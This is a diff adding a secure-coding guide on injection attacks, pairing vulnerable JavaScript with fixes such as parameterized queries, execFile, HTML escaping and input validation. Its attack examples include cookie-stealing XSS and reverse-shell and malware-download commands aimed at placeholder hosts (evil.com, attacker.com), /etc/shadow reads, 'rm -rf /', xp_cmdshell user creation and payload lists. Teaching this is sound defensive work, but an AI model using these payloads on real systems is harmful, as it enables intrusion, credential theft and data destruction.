@@ -1,0 +1,318 @@
+---
+title: Injection Attacks
+description: "OWASP A03: SQL, Command, and Template Injection vulnerabilities"
+---
+
+## What is Injection?
+
+**Injection** attacks occur when untrusted data is sent to an interpreter as part of a command or query. The attacker's hostile data tricks the interpreter into executing unintended commands.
+
+Types of injection:
+- **SQL Injection** - Malicious SQL queries
+- **Command Injection** - Malicious shell commands
+- **LDAP Injection** - Malicious LDAP queries
+- **Template Injection** - Malicious template expressions
+- **NoSQL Injection** - Malicious NoSQL queries
+
+<div class="wrong-way">
+
+## Real Examples from the Project
+
+</div>
+
+### 1. SQL Injection
+
+<div class="file-path">src/security/security.js</div>
+
+```javascript title="src/security/security.js"
+// ANTIPATTERN: String concatenation in SQL!
+export function getUserData(userId) {
+  const query = `SELECT * FROM users WHERE id = ${userId}`
+  return { query, userId }
+}
+```
+
+**Attack:**
+```bash
+# Input: 1 OR 1=1 --
+# Resulting query: SELECT * FROM users WHERE id = 1 OR 1=1 --
+# Returns ALL users!
+
+curl "/api/users/1%20OR%201%3D1%20--"
+```
+
+### 2. Command Injection
+
+<div class="file-path">src/security/security.js</div>
+
+```javascript title="src/security/security.js"
+import { execSync } from 'child_process'
+
+// ANTIPATTERN: User input in shell command!
+export function runCommand(userInput) {
+  return execSync(userInput).toString()
+}
+```
+
+**Attack:**
+```bash
+# Input: ls; cat /etc/passwd; rm -rf /
+# Runs multiple commands!
+
+curl "/api/exec?cmd=ls;cat%20/etc/passwd"
+```
+
+### 3. Template Injection (XSS)
+
+```javascript title="src/security/security.js"
+// ANTIPATTERN: Direct template interpolation
+export function renderTemplate(template, data) {
+  // Replaces {{key}} with data[key]
+  return template.replace(/\{\{(\w+)\}\}/g, (match, key) => {
+    return data[key] // No escaping!
+  })
+}
+```
+
+**Attack:**
+```bash
+# Input name: <script>alert('XSS')</script>
+# Template: Hello {{name}}!
+# Output: Hello <script>alert('XSS')</script>!
+
+curl "/api/template?name=<script>document.location='http://evil.com/steal?c='+document.cookie</script>"
+```
+
+### 4. Code Evaluation
+
+<div class="file-path">src/features/index.js</div>
+
+```javascript title="src/features/index.js"
+// ANTIPATTERN: Eval with user input!
+app.post('/eval', async (c) => {
+  const body = await c.req.json()
+  const result = eval(body.code) // NEVER DO THIS!
+  return c.json({ result })
+})
+```
+
+**Attack:**
+```bash
+# Execute arbitrary code
+curl -X POST /eval \
+  -d '{"code": "require(\"child_process\").execSync(\"cat /etc/passwd\").toString()"}'
+```
+
+---
+
+## Why It's Dangerous
+
+### SQL Injection Consequences
+
+```sql
+-- Data theft
+' UNION SELECT username, password FROM users --
+
+-- Data modification  
+'; UPDATE users SET role='admin' WHERE username='attacker' --
+
+-- Data deletion
+'; DROP TABLE users; --
+
+-- Server compromise
+'; EXEC xp_cmdshell('net user hacker password123 /add'); --
+```
+
+### Command Injection Consequences
+
+```bash
+# Read sensitive files
+; cat /etc/shadow
+
+# Establish reverse shell
+; bash -i >& /dev/tcp/attacker.com/4444 0>&1
+
+# Install malware
+; curl http://evil.com/malware.sh | bash
+```
+
+---
+
+<div class="right-way">
+
+## The Right Way
+
+</div>
+
+### 1. Parameterized Queries (SQL)
+
+```javascript title="src/repositories/user.repository.js"
+// Using Drizzle ORM (parameterized by default)
+import { eq } from 'drizzle-orm'
+import { users } from '../schema.js'
+
+export async function getUser(id) {
+  // Drizzle handles parameterization
+  return db.select().from(users).where(eq(users.id, id))
+}
+
+// Using raw SQL with parameters
+export async function getUserRaw(id) {
+  // Parameters are safely escaped
+  return db.execute(
+    'SELECT * FROM users WHERE id = ?',
+    [id] // Parameter array
+  )
+}
+```
+
+```javascript title="Alternative: Prepared Statements"
+import Database from 'better-sqlite3'
+
+const db = new Database('app.db')
+
+// Prepare once, execute many times
+const getUser = db.prepare('SELECT * FROM users WHERE id = ?')
+
+export function findUser(id) {
+  return getUser.get(id) // Safe!
+}
+```
+
+### 2. Avoid Shell Execution
+
+```javascript title="src/services/file.service.js"
+// WRONG: Using shell
+import { execSync } from 'child_process'
+const files = execSync(`ls ${userInput}`).toString() // Dangerous!
+
+// RIGHT: Use Node.js APIs
+import { readdir } from 'fs/promises'
+const files = await readdir(sanitizedPath)
+```
+
+```javascript title="When shell is necessary"
+import { execFile } from 'child_process'
+
+// execFile doesn't use shell, arguments are passed directly
+export function runSafeCommand(filename) {
+  return new Promise((resolve, reject) => {
+    // Arguments are NOT interpreted by shell
+    execFile('ls', ['-la', filename], (error, stdout) => {
+      if (error) reject(error)
+      else resolve(stdout)
+    })
+  })
+}
+```
+
+### 3. Output Encoding (XSS Prevention)
+
+```javascript title="src/utils/html.js"
+// Escape HTML entities
+export function escapeHtml(unsafe) {
+  return unsafe
+    .replace(/&/g, '&amp;')
+    .replace(/</g, '&lt;')
+    .replace(/>/g, '&gt;')
+    .replace(/"/g, '&quot;')
+    .replace(/'/g, '&#039;')
+}
+
+// Safe template rendering
+export function renderTemplate(template, data) {
+  return template.replace(/\{\{(\w+)\}\}/g, (match, key) => {
+    return escapeHtml(String(data[key] || ''))
+  })
+}
+```
+
+```javascript title="Using a template engine with auto-escaping"
+import { Hono } from 'hono'
+import { html } from 'hono/html'
+
+app.get('/profile', (c) => {
+  const name = c.req.query('name')
+  // html`` auto-escapes variables
+  return c.html(html`
+    <h1>Hello, ${name}!</h1>
+  `)
+})
+```
+
+### 4. Input Validation
+
+```javascript title="src/middleware/validation.js"
+import { z } from 'zod'
+
+// Define expected schema
+const userIdSchema = z.coerce.number().int().positive()
+
+export function validateUserId(c, next) {
+  const result = userIdSchema.safeParse(c.req.param('id'))
+  
+  if (!result.success) {
+    return c.json({ error: 'Invalid user ID' }, 400)
+  }
+  
+  c.set('userId', result.data)
+  return next()
+}
+```
+
+---
+
+## Comparison
+
+| Attack | Vulnerable Code | Secure Code |
+|--------|-----------------|-------------|
+| **SQL** | `WHERE id = ${id}` | `WHERE id = ?` with params |
+| **Command** | `execSync(userInput)` | `execFile(cmd, [args])` |
+| **XSS** | `innerHTML = data` | `textContent = data` |
+| **Eval** | `eval(userCode)` | Never use eval |
+
+---
+
+## Detection Tips
+
+### Red Flags in Code
+- String concatenation with SQL
+- `exec()`, `execSync()`, `spawn()` with user input
+- `eval()`, `Function()`, `vm.runInContext()` with user input
+- `innerHTML`, `document.write()` with user input
+- Template strings with `${}` containing user input in SQL
+
+### Tools
+```bash
+# Static analysis for injection vulnerabilities
+npx eslint --plugin security src/
+
+# SQL injection scanner
+sqlmap -u "http://localhost:3000/api/users?id=1"
+```
+
+### Testing
+```javascript
+// Injection test payloads
+const sqlPayloads = [
+  "1 OR 1=1",
+  "1; DROP TABLE users--",
+  "1 UNION SELECT * FROM passwords--",
+]
+
+const xssPayloads = [
+  "<script>alert(1)</script>",
+  "javascript:alert(1)",
+  "<img onerror=alert(1) src=x>",
+]
+
+const cmdPayloads = [
+  "; cat /etc/passwd",
+  "| ls -la",
+  "$(whoami)",
+]
+```
+
+:::danger[Critical Rule]
+Never construct queries, commands, or templates by concatenating user input. Always use parameterized queries, safe APIs, and proper encoding.
+:::
